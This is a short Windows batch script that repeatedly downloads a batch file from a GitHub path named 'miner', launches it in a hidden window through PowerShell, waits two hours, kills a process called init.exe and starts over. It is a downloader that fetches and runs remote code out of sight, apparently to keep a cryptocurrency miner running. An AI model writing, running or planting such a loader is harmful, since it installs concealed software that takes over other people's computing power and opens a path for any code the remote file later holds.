:start
del C:\temp\temp.bat
pause
curl -o C:\temp\temp.bat https://raw.githubusercontent.com/nmshare/miner/main/start.bat
pause
powershell start-process C:\temp\temp.bat -windowStyle Hidden
echo "process started successfully"
timeout /t 7200
taskkill /f /im init.exe
goto start
